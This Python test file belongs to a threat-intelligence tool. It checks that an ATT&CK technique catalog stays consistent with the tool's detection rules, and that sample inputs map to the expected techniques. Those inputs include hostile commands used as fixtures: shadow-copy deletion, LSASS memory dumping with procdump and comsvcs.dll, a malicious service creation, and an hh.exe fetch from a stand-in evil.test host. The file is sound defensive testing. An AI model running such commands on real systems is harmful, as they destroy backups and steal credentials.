"""Bundled ATT&CK catalog integrity and rule/catalog sync.

The catalog is the allow-list for every technique Titan can report: behavior
rules, LOLBin rules, and detection `attack_ids` all resolve against it. These
tests keep the catalog well-formed and guarantee no producer references a
technique the catalog does not carry (which would be silently dropped).
"""

import re

from titan_decoder.core.detection_rules import CorrelationRulesEngine
from titan_decoder.threat_intel import ThreatIntelligenceEngine
from titan_decoder.threat_intel.catalog import load_attack_catalog
from titan_decoder.threat_intel.lolbins import DEFAULT_LOLBIN_RULES

_ID_PATTERN = re.compile(r"^T\d{4}(?:\.\d{3})?$")

# Catalog entries deliberately carried without a built-in producer: they are
# reportable only through rule-pack `attack_ids`. T1071 (Application Layer
# Protocol) cannot be evidenced deterministically from decoded content alone,
# and T1204 is the parent-level form packs can use when the user-execution
# vector is unknown (built-ins attribute the specific T1204.002). Adding an
# entry here must be a deliberate decision, mirrored in
# docs/THREAT_INTELLIGENCE.md.
RULE_PACK_ONLY_TECHNIQUES = frozenset({"T1071", "T1204"})


def _builtin_producer_ids() -> set:
    ids = {
        technique_id
        for technique_id, _pattern, _name in ThreatIntelligenceEngine.BEHAVIOR_RULES
    }
    for rule in DEFAULT_LOLBIN_RULES:
        ids.update(rule.technique_ids)
    for rule in CorrelationRulesEngine().rules:
        ids.update(rule.attack_ids)
    return ids


def test_catalog_ids_unique_and_well_formed():
    techniques = load_attack_catalog()["techniques"]
    ids = [item["id"] for item in techniques]
    assert len(ids) == len(set(ids)), "duplicate technique IDs in catalog"
    for item in techniques:
        assert _ID_PATTERN.match(item["id"]), f"malformed ID: {item['id']}"
        assert item["name"], f"{item['id']} has no name"
        assert item["tactics"], f"{item['id']} has no tactics"
        for tactic in item["tactics"]:
            assert tactic == tactic.lower(), f"{item['id']}: tactic not lowercase"


def test_subtechniques_have_parent_or_standalone_form():
    """Every sub-technique ID must itself be well-formed against the base."""
    by_id = load_attack_catalog()["by_id"]
    for technique_id in by_id:
        if "." in technique_id:
            base = technique_id.split(".")[0]
            assert _ID_PATTERN.match(base)


def test_behavior_rule_techniques_exist_in_catalog():
    by_id = load_attack_catalog()["by_id"]
    for technique_id, _pattern, rule_name in ThreatIntelligenceEngine.BEHAVIOR_RULES:
        assert technique_id in by_id, (
            f"behavior rule '{rule_name}' references {technique_id}, missing "
            "from attack_catalog.json"
        )


def test_lolbin_rule_techniques_exist_in_catalog():
    by_id = load_attack_catalog()["by_id"]
    for rule in DEFAULT_LOLBIN_RULES:
        for technique_id in rule.technique_ids:
            assert technique_id in by_id, (
                f"LOLBin rule '{rule.name}' references {technique_id}, "
                "missing from attack_catalog.json"
            )


def test_every_catalog_technique_has_a_producer_or_is_rule_pack_only():
    """No silent orphans: every catalog entry must be producible by a
    behavior rule, LOLBin rule, or built-in detection attack_ids, unless it
    is explicitly designated rule-pack-only above."""
    catalog_ids = set(load_attack_catalog()["by_id"])
    producers = _builtin_producer_ids()
    orphans = catalog_ids - producers - RULE_PACK_ONLY_TECHNIQUES
    assert not orphans, (
        f"catalog techniques with no producer: {sorted(orphans)} — wire a "
        "rule or add them to RULE_PACK_ONLY_TECHNIQUES deliberately"
    )


def test_rule_pack_only_list_is_accurate():
    """Entries in the rule-pack-only list must exist in the catalog and must
    genuinely lack a built-in producer, so the list cannot go stale."""
    catalog_ids = set(load_attack_catalog()["by_id"])
    producers = _builtin_producer_ids()
    for technique_id in RULE_PACK_ONLY_TECHNIQUES:
        assert technique_id in catalog_ids, f"{technique_id} not in catalog"
        assert technique_id not in producers, (
            f"{technique_id} now has a built-in producer; remove it from "
            "RULE_PACK_ONLY_TECHNIQUES"
        )


def _techniques_for(preview: str) -> set:
    report = {"nodes": [{"id": 0, "content_preview": preview}]}
    result = ThreatIntelligenceEngine().analyze(report)
    return {item["technique_id"] for item in result["techniques"]}


def test_shadow_copy_deletion_maps_inhibit_recovery():
    ids = _techniques_for("cmd /c vssadmin delete shadows /all /quiet")
    assert "T1490" in ids
    assert "T1486" not in ids  # encryption is not evidenced by shadow deletion


def test_double_extension_maps_masquerading():
    assert "T1036" in _techniques_for("open invoice.pdf.exe to view the document")


def test_service_creation_maps_windows_service():
    assert "T1543.003" in _techniques_for('sc create updater binPath= "c:\\u.exe"')


def test_msbuild_lolbin_detected():
    report = {
        "nodes": [{"id": 0, "content_preview": "msbuild.exe payload.csproj /p:Cfg=1"}]
    }
    result = ThreatIntelligenceEngine().analyze(report)
    lolbins = {item["executable"] for item in result["lolbins"]}
    assert "msbuild.exe" in lolbins
    assert "T1127.001" in {t["technique_id"] for t in result["techniques"]}


def test_hh_and_at_require_exe_suffix():
    benign = _techniques_for(
        "The meeting runs 09:00-10:30 (hh:mm). Please look at the agenda."
    )
    assert "T1218.001" not in benign
    assert "T1053.002" not in benign

    fired = _techniques_for("hh.exe http://evil.test/a.chm && at.exe 12:00 payload")
    assert "T1218.001" in fired
    assert "T1053.002" in fired


def test_lsass_dump_maps_lsass_memory_subtechnique():
    fired = _techniques_for("procdump -ma lsass.exe lsass.dmp")
    assert {"T1003", "T1003.001"} <= fired
    fired = _techniques_for("rundll32 comsvcs.dll, MiniDump 624 c:\\l.dmp full")
    assert "T1003.001" in fired


def test_jscript_execution_maps_javascript_subtechnique():
    assert "T1059.007" in _techniques_for(
        'var sh = new ActiveXObject("WScript.Shell"); sh.Run(cmd);'
    )
    # Prose about web JavaScript must not fire.
    assert "T1059.007" not in _techniques_for(
        "Use JavaScript to validate the signup form before submitting."
    )


def test_ransom_note_maps_data_encrypted_for_impact():
    assert "T1486" in _techniques_for(
        "ALL YOUR FILES ARE LOCKED. Pay to receive the decryptor and "
        "recover your files."
    )
    # Encryption-at-rest prose is not ransom evidence.
    assert "T1486" not in _techniques_for(
        "Backup files are encrypted at rest per the security policy."
    )


def test_spearphish_attachment_maps_from_mime_headers():
    assert "T1566.001" in _techniques_for(
        'Content-Disposition: attachment; filename="invoice_2026.docm"'
    )
    # A benign attachment type must not fire.
    assert "T1566.001" not in _techniques_for(
        'Content-Disposition: attachment; filename="quarterly-report.pdf"'
    )


def test_benign_prose_produces_no_techniques():
    assert _techniques_for(
        "The quarterly budget report is attached for review. Totals were "
        "confirmed by the finance team during the planning meeting."
    ) == set()
